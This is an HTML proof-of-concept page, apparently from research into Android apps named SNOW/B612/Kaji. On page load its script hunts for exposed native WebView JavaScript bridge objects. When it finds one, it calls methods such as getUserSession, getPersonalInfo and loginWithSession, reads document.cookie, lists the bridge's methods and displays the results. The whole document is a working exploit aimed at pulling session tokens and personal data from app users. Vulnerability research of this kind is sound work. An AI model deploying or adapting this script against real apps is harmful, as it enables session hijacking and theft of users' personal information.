
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{background:#111;color:#0f0;font-family:monospace;font-size:12px;padding:10px;word-break:break-all}
.r{color:#ff0;font-weight:bold;display:block;margin-top:6px}
.v{color:#0ff}
.e{color:#f44}
.ok{color:#0f0}
</style>
</head>
<body>
<span class="r">== SNOW Bridge PoC ==</span>
<div id="o"><span class="v">init...</span></div>
<script>
var o = document.getElementById('o');
var log = function(k, v, cls) {
  o.innerHTML += '<span class="r">[' + k + ']</span><span class="' + (cls||'v') + '">' + String(v) + '</span>';
};

function scan() {
  // 1. window 전체 스캔 — Bridge 탐색
  var found = [];
  var keywords = ['bridge','Bridge','android','Android','kaji','Kaji','snow','Snow','interface','Interface'];
  try {
    for (var k in window) {
      try {
        if (typeof window[k] === 'object' && window[k] !== null && window[k] !== window) {
          var lk = k.toLowerCase();
          if (keywords.some(function(w){return lk.indexOf(w.toLowerCase())>=0;})) {
            found.push(k);
          }
        }
      } catch(e) {}
    }
  } catch(e) {}

  log('window scan', found.length ? found.join(', ') : '(none)', found.length ? 'ok' : 'e');

  // 2. 직접 Bridge 이름 체크
  var names = ['B612KajiBridgeInterface','AndroidBridge','androidBridge',
                'snowBridge','SnowBridge','kajiBridge','KajiBridge',
                'b612','B612','nativeInterface'];
  var bridge = null, bname = null;
  names.forEach(function(n){
    var exists = false;
    try { exists = typeof window[n] !== 'undefined'; } catch(e){}
    log('typeof ' + n, typeof window[n], exists ? 'ok' : 'e');
    if (exists && !bridge) { bridge = window[n]; bname = n; }
  });

  if (!bridge) {
    log('RESULT', 'Bridge NOT found — 재시도 중...', 'e');
    return false;
  }

  // 3. Bridge 발견
  log('BRIDGE FOUND', bname, 'ok');

  // 4. 메서드 실행
  try { log('getUserSession', bridge.getUserSession(), 'v'); }
  catch(e) { log('getUserSession_ERR', e, 'e'); }

  try { log('getPersonalInfo', bridge.getPersonalInfo(), 'v'); }
  catch(e) { log('getPersonalInfo_ERR', e, 'e'); }

  try { log('appInfo', bridge.appInfo(), 'v'); }
  catch(e) { log('appInfo_ERR', e, 'e'); }

  log('cookie', document.cookie || '(empty)');

  try {
    bridge.loginWithSession(function(r){
      log('loginWithSession', r, 'ok');
      log('cookie_after', document.cookie || '(empty)');
    });
  } catch(e) { log('loginWithSession_ERR', e, 'e'); }

  // 5. 전체 메서드 목록
  try {
    var ms = [];
    for (var m in bridge) {
      try { if (typeof bridge[m]==='function') ms.push(m); } catch(ee){}
    }
    log('methods(' + ms.length + ')', ms.join(', ') || '(none)');
  } catch(e) {}

  return true;
}

// 즉시 실행
var done = scan();

// 실패 시 재시도 (0.5s, 1s, 2s, 3s)
if (!done) {
  [500, 1000, 2000, 3000].forEach(function(t) {
    setTimeout(function() {
      if (!done) {
        o.innerHTML += '<span class="r">[retry ' + t + 'ms]</span>';
        done = scan();
      }
    }, t);
  });
}
</script>
</body>
</html>
